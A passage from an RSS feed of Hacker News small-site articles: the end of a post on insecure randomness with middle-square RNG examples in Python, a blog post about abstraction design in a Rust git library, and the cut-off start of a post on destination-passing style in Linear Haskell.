   <g transform="translate(-300,0)"><text x="0" y="30" dy="0.7ex" transform="scale(0.75,1)">69</text><path d="M 5, 30 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-260,0)"><text x="0" y="40" dy="0.7ex" transform="scale(0.75,1)">89</text><path d="M 5, 40 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="50" dy="0.7ex" transform="scale(0.75,1)">37</text><path d="M 5, 50 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="60" dy="0.7ex" transform="scale(0.75,1)">58</text><path d="M 5, 60 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="70" dy="0.7ex" transform="scale(0.75,1)">43</text><path d="M 5, 70 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">62</text><path d="M 5, 80 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">25</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">16</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">13</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">56</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">81</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="90" dy="0.7ex" transform="scale(0.75,1)">87</text><path d="M 5, 90 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="100" dy="0.7ex" transform="scale(0.75,1)">68</text><path d="M 5,100 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="100" dy="0.7ex" transform="scale(0.75,1)">41</text><path d="M 5,100 H 9 V 100"></path><use xlink:href="#arrow" transform="translate(0,100)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="110" dy="0.7ex" transform="scale(0.75,1)">75</text><path d="M 5,110 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">32</text><path d="M 5,120 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">18</text><path d="M 5,120 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">72</text><path d="M 5,120 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">27</text><path d="M 5,120 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="130" dy="0.7ex" transform="scale(0.75,1)">61</text><path d="M 5,130 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="140" dy="0.7ex" transform="scale(0.75,1)">82</text><path d="M 5,140 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="150" dy="0.7ex" transform="scale(0.75,1)">73</text><path d="M 5,150 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="160" dy="0.7ex" transform="scale(0.75,1)">45</text><path d="M 5,160 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="170" dy="0.7ex" transform="scale(0.75,1)">55</text><path d="M 5,170 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="180" dy="0.7ex" transform="scale(0.75,1)">95</text><path d="M 5,180 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">03</text><path d="M 5,190 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">06</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">08</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">09</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">64</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">93</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">44</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">21</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">96</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-220,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">31</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-220,0)"><text x="0" y="200" dy="0.7ex" transform="scale(0.75,1)">63</text><path d="M 5,200 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="210" dy="0.7ex" transform="scale(0.75,1)">38</text><path d="M 5,210 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="220" dy="0.7ex" transform="scale(0.75,1)">33</text><path d="M 5,220 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="230" dy="0.7ex" transform="scale(0.75,1)">78</text><path d="M 5,230 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="230" dy="0.7ex" transform="scale(0.75,1)">28</text><path d="M 5,230 H 9 V 230"></path><use xlink:href="#arrow" transform="translate(0,230)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="230" dy="0.7ex" transform="scale(0.75,1)">17</text><path d="M 5,230 H 9 V 230"></path><use xlink:href="#arrow" transform="translate(0,230)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="240" dy="0.7ex" transform="scale(0.75,1)">91</text><path d="M 5,240 H 9 V 230"></path><use xlink:href="#arrow" transform="translate(0,230)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="240" dy="0.7ex" transform="scale(0.75,1)">54</text><path d="M 5,240 H 9 V 240"></path><use xlink:href="#arrow" transform="translate(0,240)"></use></g>
  </g>
  <g transform="translate(0,10)">
   <g transform="translate(-20 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">10</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#loop1" transform="translate(0,250)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">90</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">30</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">48</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">22</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">15</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">34</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="260" dy="0.7ex" transform="scale(0.75,1)">35</text><path d="M 5,260 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="260" dy="0.7ex" transform="scale(0.75,1)">66</text><path d="M 5,260 H 9 V 260"></path><use xlink:href="#arrow" transform="translate(0,260)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="270" dy="0.7ex" transform="scale(0.75,1)">65</text><path d="M 5,270 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="280" dy="0.7ex" transform="scale(0.75,1)">85</text><path d="M 5,280 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="290" dy="0.7ex" transform="scale(0.75,1)">59</text><path d="M 5,290 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="300" dy="0.7ex" transform="scale(0.75,1)">67</text><path d="M 5,300 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="300" dy="0.7ex" transform="scale(0.75,1)">26</text><path d="M 5,300 H 9 V 300"></path><use xlink:href="#arrow" transform="translate(0,300)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="310" dy="0.7ex" transform="scale(0.75,1)">70</text><path d="M 5,310 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="310" dy="0.7ex" transform="scale(0.75,1)">52</text><path d="M 5,310 H 9 V 310"></path><use xlink:href="#arrow" transform="translate(0,310)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="310" dy="0.7ex" transform="scale(0.75,1)">23</text><path d="M 5,310 H 9 V 310"></path><use xlink:href="#arrow" transform="translate(0,310)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="320" dy="0.7ex" transform="scale(0.75,1)">39</text><path d="M 5,320 H 9 V 310"></path><use xlink:href="#arrow" transform="translate(0,310)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="320" dy="0.7ex" transform="scale(0.75,1)">86</text><path d="M 5,320 H 9 V 320"></path><use xlink:href="#arrow" transform="translate(0,320)"></use></g>
  </g>
  <g>
   <g transform="translate(-20 ,0)"><text x="0" y="330" dy="0.7ex" transform="scale(0.75,1)">50</text><path d="M 5,330 H 9 V 330"></path><use xlink:href="#loop1" transform="translate(0,330)"></use></g>
  </g>
  <g transform="translate(0,10)">
   <g transform="translate(-20 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">60</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#loop1" transform="translate(0,340)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">40</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">20</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">47</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">74</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">88</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">83</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">94</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="350" dy="0.7ex" transform="scale(0.75,1)">49</text><path d="M 5,350 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="360" dy="0.7ex" transform="scale(0.75,1)">80</text><path d="M 5,360 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="360" dy="0.7ex" transform="scale(0.75,1)">53</text><path d="M 5,360 H 9 V 360"></path><use xlink:href="#arrow" transform="translate(0,360)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="370" dy="0.7ex" transform="scale(0.75,1)">99</text><path d="M 5,370 H 9 V 360"></path><use xlink:href="#arrow" transform="translate(0,360)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="380" dy="0.7ex" transform="scale(0.75,1)">97</text><path d="M 5,380 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="390" dy="0.7ex" transform="scale(0.75,1)">51</text><path d="M 5,390 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="400" dy="0.7ex" transform="scale(0.75,1)">98</text><path d="M 5,400 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
  </g>
  <g transform="translate(0,20)">
   <g transform="translate(-20 ,0)"><text x="0" y="410" dy="0.7ex" transform="scale(0.75,1)">24</text><path d="M 5,410 H 9 V 410"></path><use xlink:href="#loop2" transform="translate(0,410)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="410" dy="0.7ex" transform="scale(0.75,1)">57</text><path d="M 5,410 H 9 V 410"></path><use xlink:href="#arrow" transform="translate(0,410)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="420" dy="0.7ex" transform="scale(0.75,1)">79</text><path d="M 5,420 H 9 V 410"></path><use xlink:href="#arrow" transform="translate(0,410)"></use></g>
  </g>
 </g>
</svg>

			<label for="mn-demo">⊕</label>
			
			<span>
				<i>Directed graph of all 100 2-digit pseudorandom numbers obtained using the middle-square method</i>, by CMG Lee.
			</span>
		</figure>
		<p>Performance for the version with 4 digits of state is better; the average length of time before being trapped in a cycle is after 43 outputs<label for="6"></label><span>Another useful property of these RNGs is that it is pretty obvious when they are starting to break down- among the 10000 numbers the 4-digit version can output, only <i><code>0, 9600, 1600, 5600, 8100, 100, 4100, 2916, 2500, 3009, 5030, 3600, 7600, 3792, 2100, 6100, 540</code></i> immediately lead to decay. </span>. That code looks something like this, just so you get the idea:</p>
		<figure><pre><code data-lang="python"><span>def</span> <span>von_neumann_generator</span><span>(</span><span>state</span><span>):</span>
	<span>"""The version with a 4 digit state/output
	not to be confused with the one above, that
	has two."""</span>

	<span>#e.g. 1234**2-&gt;1522756
</span>	<span>square</span> <span>=</span> <span>state</span><span>**</span><span>2</span> 

	<span>#1522756 -&gt; 01522756
</span>	<span>formattedSquare</span> <span>=</span> <span>"%08d"</span> <span>%</span> <span>square</span>

	<span>#01522756 -&gt; 5227
</span>	<span>next_state</span> <span>=</span> <span>output</span> <span>=</span> <span>int</span><span>(</span><span>formattedSquare</span><span>[</span><span>2</span><span>:</span><span>6</span><span>])</span>
	<span>return</span> <span>(</span><span>next_state</span><span>,</span><span>output</span><span>)</span>
<span>state</span> <span>=</span> <span>1234</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>20</span><span>):</span>
	<span>state</span><span>,</span><span>output</span> <span>=</span> <span>von_neumann_generator</span><span>(</span><span>state</span><span>)</span>
	<span>print</span><span>(</span><span>output</span><span>)</span>
		</code></pre></figure>
		<p>You can see in the above example that the state and the output are identical, but there is no particular reason this has to be the case. For example, we could have the state be the inner four numbers, with the output being the <i>outer</i> four numbers:</p>
		<figure><pre><code data-lang="python"><span>def</span> <span>much_better_von_neumann_generator</span><span>(</span><span>state</span><span>):</span>
	<span>square</span> <span>=</span> <span>state</span><span>**</span><span>2</span> <span># e.g. 1234**2-&gt;1522756
</span>	<span>formattedSquare</span> <span>=</span> <span>"%08d"</span><span>%</span><span>square</span>
	<span>output</span> <span>=</span> <span>int</span><span>(</span><span>formattedSquare</span><span>[</span><span>0</span><span>:</span><span>2</span><span>]</span><span>+</span><span>formattedSquare</span><span>[</span><span>6</span><span>:])</span>
	<span>next_state</span> <span>=</span> <span>int</span><span>(</span><span>formattedSquare</span><span>[</span><span>2</span><span>:</span><span>6</span><span>])</span>
	<span>return</span> <span>(</span><span>next_state</span><span>,</span><span>output</span><span>)</span>
<span>state</span> <span>=</span> <span>1234</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>40</span><span>):</span>
	<span>state</span><span>,</span><span>output</span> <span>=</span> <span>much_better_von_neumann_generator</span><span>(</span><span>state</span><span>)</span>
	<span>print</span><span>(</span><span>output</span><span>)</span>
		</code></pre></figure>
		<p>This RNG is also not quite ready for prime time, but the relationship between the output and state is already harder to guess. However, they are clearly <i>interconnected</i> in some causal sense, a fact we will return to in a bit. For now, we are starting to see a few important tensions in the design of RNGs already:</p>
		<ul>
			<li><b>Unpredictability</b> – Increasing the number of digits in the output/state increases the unpredictability of the output. Sometimes less adroitly designed algorithms (like the one above) will eventually degenerate to some kind of undesirable low-randomness state, but most ones in use in computers simply will iterate through their entire state in some order before returning to the original one. Among the generators that look superficially okay, there are a lot of mathematically interesting ways to verify this intuition: we can count the number of bits to make sure it is evenly distributed; we can figure out if the runs of ones and zeros look OK, and a …</li></ul></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html">https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html</a></em></p>]]>
            </description>
            <link>https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068571</guid>
            <pubDate>Thu, 12 Nov 2020 10:57:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[That's the Wrong Abstraction Layer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068566">thread link</a>) | @pcr910303
<br/>
November 12, 2020 | https://spacekookie.de/blog/thats-the-wrong-abstraction-layer/ | <a href="https://web.archive.org/web/*/https://spacekookie.de/blog/thats-the-wrong-abstraction-layer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I'm writing this post mostly to my future self, not any specific
project or piece of code I've seen other people write.  That's not to
say that I don't think this is something that probably applies to many
projects.  Sometimes it's easy to lose sight of what we're doing, and
it's good to be reminded.</p>
<p>So to start at the beginning: I've been working on <a href="https://git.spacekookie.de/kookienomicon/tree/apps/servers/octopus/supergit?h=main">supergit</a>, a Rust
library to parse git repositories.  It's built on top of <code>libgit2</code>
(and the <code>git2</code> rust bindings), and aims to create a more Rustic
interface and type fascade for git repositories.  It also aims to
solve issues such as: rename detection, path-history, and subtree
management.  I'm writing this library for <a href="https://git.spacekookie.de/kookienomicon/tree/apps/servers/octopus/?h=main">octopus</a>, which will
eventually host my monorepo.</p>
<p>In <code>supergit</code> the main workflow is around iterating things, seeing as
git is an acyclical graph, and iterators are a decent way to view this
datastructure.  But git graphs can get pretty big.  I wanted the
iterator to be configurable in a way that allows someone to write a
tool that searches a whole repository history, while also making it
possible to step through a history 20 commits at a time (to implement
history pagination on a website, for example).</p>
<p>Looking at the current API, this is how you would implement the
latter, for a <code>main</code> branch:</p>
<div><pre><span></span><code><span>use</span><span> </span><span>supergit</span>::<span>Repository</span><span>;</span><span></span>

<span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>path</span><span> </span><span>=</span><span> </span><span>..</span><span>.</span><span> </span><span>// get your repository path somehow</span>
<span>    </span><span>let</span><span> </span><span>repo</span><span> </span><span>=</span><span> </span><span>Repository</span>::<span>open</span><span>(</span><span>path</span><span>).</span><span>unwrap</span><span>();</span><span></span>

<span>    </span><span>let</span><span> </span><span>main</span><span> </span><span>=</span><span> </span><span>repo</span><span>.</span><span>get_branch</span><span>(</span><span>"main"</span><span>).</span><span>unwrap</span><span>();</span><span></span>
<span>    </span><span>let</span><span> </span><span>iter</span><span> </span><span>=</span><span> </span><span>main</span><span>.</span><span>get</span><span>(</span><span>20</span><span>);</span><span></span>

<span>    </span><span>iter</span><span>.</span><span>for_each</span><span>(</span><span>|</span><span>c</span><span>|</span><span> </span><span>{</span><span></span>
<span>        </span><span>println</span><span>!</span><span>(</span><span>"{}: {}"</span><span>,</span><span> </span><span>c</span><span>.</span><span>commit</span><span>().</span><span>id_str</span><span>(),</span><span> </span><span>c</span><span>.</span><span>commit</span><span>().</span><span>summary</span><span>());</span><span></span>
<span>    </span><span>});</span><span></span>
<span>}</span><span></span>
</code></pre></div>


<p>That's easy enough, right?  But wait, why am I calling <code>.commit()</code> on
<code>c</code>.  Isn't it already a commit?  Well...sort of.  In <code>supergit</code>, this
type is a <code>BranchCommit</code>, because this is where things get
complicated.</p>
<h2>Sort of like a tree, but not really</h2>
<p>In git, rarely is a branch just a history of single commits.  Maybe
this is how some people think about their history, but it certainly
has never been the case for any of the repositories that I work on.
Basically the second you have more than one contributor, it's very
common for a history to have merge-commits in it.</p>
<p>So how do we deal with that in an iterator?  The design I chose was to
wrap a <code>Commit</code> object in another type, which can convey this state.
<code>BranchCommit</code> is an enum and has three variants: <code>Commit</code> (maybe I
should rename that to <code>Simple</code> or something?), <code>Merge</code>, and <code>Octopus</code>
(if you don't know what an octopus merge is, don't worry about it.
Most people don't and they're very rare and weird).</p>
<p>What <code>Merge</code> and <code>Octopus</code> contain are new <code>Branch</code> handles (the type
returned by <code>get_branch()</code>), meaning that for every split it's now up
to the user to decide whether they want to continue first-parent
(i.e. only ever follow the main branch line, ignoring the history of
merged branches), or if they want to enumerate the histories as well.
Most importantly: for every branch merge, you get to re-decide what
your iterator strategy should be: infinate, limited by number, or
limited up to a certain commit-hash.</p>
<p>So far so good I thought, this is an okay enough interface for me to
work with.  But this is where some problems appeared.</p>
<h2>File histories (and git internals)</h2>
<p><em>(a slight de-tour through git - feel free to skip)</em></p>
<p>The main reason why I'm writing this more Rustic wrapper around
<code>libgit2</code> is to make it easier to determine what the history of a file
has been.  This is pretty simple to find out via the git CLI (<code>git log
-- &lt;your file here&gt;</code>), but not something that <code>libgit2</code> exposes,
because that's not how git stores data.</p>
<p>To git, all data is stored in a key-value store indexed by a SHA1
(soon to be SHA256 I think?) hash reference.  That applies to files,
full file trees, and commits as well.  Say we have a file <code>acab.txt</code>,
we commit it and it gets the ID
<code>da39a3ee5e6b4b0d3255bfef95601890afd80709</code> (the file ID, not the
commit ID!), but then we open it and write <code>ACAB</code> in it, and commit
that again.  Now the file ID is
<code>99f069b8a0cbe4c9485a14fe50775d0f71deb4e7</code>.  Both these files are
saved in the git object store, because after all you might want to go
back to the older version.</p>
<p>But here's the thing: from the actual commits we can get two things:
the file tree at the time of commit, and the commit parents.  To
figure out what actually <em>changed</em> in the commit, you have to diff it
against it's parents, which is exactly what <code>git show</code> does if you
give it a reference to a commit.</p>
<p>What this means is that if you want to have a library that grabs the
history of a path, well you'll have to go through all commits, and
check the tree for changes at that specific path.  Furthermore, that
won't actually let you know if a file has simply been renamed, only
that it has changed.  Further logic is required to figure out if the
file is the same, but just has a different name.</p>
<p>And all of this is something that <code>supergit</code> implements, behind a nice
Rustic API (I hope...).</p>
<h2>Bloated abstractions</h2>
<p>So I wrote a function that would, for a branch iterator, step along it
and check the history of a path, by diffing each commit with it's
parents, and tracking a path via the delta information in the diff.
But this is where I ran into problems.  Because my iterator design
always chose the first-parent to step through.  Other branches were
ignored, and because the function accepted an iterator and stepped it
internally, there was no way for my <code>file_history()</code> function to
figure out the exact behaviour the user wanted.</p>
<p>My first instinct was to implement branching in the <code>BranchIter</code>
itself; allowing it to branch off, essentially pushing commits it
would have to get back to onto a stack, and resuming from a previous
position.  That turned out to be a really <a href="https://git.spacekookie.de/kookienomicon/commit/apps/servers/octopus/supergit?h=main&amp;id=0728c2f325e2eaac2c3b834260a8d0a97afaff63">bad idea</a>.</p>
<p>It took me about an hour of banging my head against this abstraction
before I realised that it wasn't meant to be.  Sometimes systems are
self-contained, and adding more functionality takes a considerable
amount of effort, and begs the question, if it's really the right
choice to make.  Why add more functionality to an abstraction that
works fine on it's own?</p>
<p>Instead, embrace composition, and add another layer on top, that can
use the previous.  You end up with a much more managable design, and
data can flow from one layer to the next.  Make sure that your
interfaces are flexible enough to be re-used, but don't think that
just because a component <em>could</em> technically be responsible for some
work, that it really has to implement this work.</p>
<p>And that's it basically.  Thanks for reading my ramblings about git
and one of my side-projects.  I hope I managed to make you think about
the way you build systems a bit, and maybe next time you are in a
situation similar to this one, don't be like me :)</p>
  </div></div>]]>
            </description>
            <link>https://spacekookie.de/blog/thats-the-wrong-abstraction-layer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068566</guid>
            <pubDate>Thu, 12 Nov 2020 10:55:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pure destination-passing style in Linear Haskell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068394">thread link</a>) | @gbrown_
<br/>
November 12, 2020 | https://www.tweag.io/blog/2020-11-11-linear-dps/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-11-11-linear-dps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>My goal today is to convince you that destination-passing style is
neat, actually. And that <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> make
destination-passing purely functional. But first, I must answer a
question.</p>
<h2>What is destination-passing style?</h2>
<p>If you’ve ever programmed in C, C++, or Fortran, you are sure to have
encountered the style of programming which sometimes goes by the name
<em>destination-passing style</em>. It is the practice of writing, <em>e.g.</em> an
array-producing functions as, instead, taking an empty array as an
extra argument and filling it. Consider, for example, the C <code>strcpy</code> function:</p>
<div data-language="c"><pre><code><span>char</span><span>*</span> <span>strcpy</span> <span>(</span> <span>char</span><span>*</span> destination<span>,</span> <span>const</span> <span>char</span><span>*</span> source <span>)</span><span>;</span></code></pre></div>
<p>It copies the string in <code>source</code> to the array <code>destination</code> (it also
returns <code>destination</code> when it’s done).</p>
<p>The name “destination-passing style” itself seems to be more common in
the functional programming language compilation literature, however. C
programmers don’t appear to have a name for it. So it is likely that
you have never encountered it.</p>
<h2>But this is extremely imperative, why should I care?</h2>
<p>Why, indeed, care about destination-passing? It does let you ask a new
question: “whose responsibility is it to allocate the array?“. If I
were to write an array copy in Haskell, it would have type</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span></code></pre></div>
<p>And there is no way around <code>copyArray</code> allocating an array itself. The
question doesn’t even exist. With <code>strcpy</code>, I can either choose to
allocate an array, and pass it immediately to <code>strcpy</code>, or, I can
delegate the allocation of the array to someone else.</p>
<p>But, once I can ask this question, what can I do with it? I can
compose it! Let’s imagine that we have a function to split an array in
two</p>
